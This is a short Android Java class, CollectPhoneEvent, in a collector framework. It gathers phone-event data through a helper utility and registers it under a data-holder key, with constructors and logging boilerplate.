package com.xaviar.collect.phone_event;


import android.content.Context;
import android.util.Log;

import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;

public class CollectPhoneEvent extends ThreadCollector implements ICollector {

	private  static String name = "CollectPhoneEvent";
	private static final String TAG = name;
	
	

	public CollectPhoneEvent(String genericData) {
		this.genericData = genericData;
	}
	
	public CollectPhoneEvent() {
		setName(CollectPhoneEvent.name);
	}


	public CollectPhoneEvent(Context ctx) {
		setContext(ctx);
	}

	@Override
	protected String getAllData() {
		Log.d(TAG,"Enter getAllData()");
		genericData = PhoneEventUtil.getAllPhoneGeneric(ctx);			
		return genericData;
	}

	
	@Override
	public String getHolderKey() {
	   return DataHolder.PHONE_EVENT;
	}

}


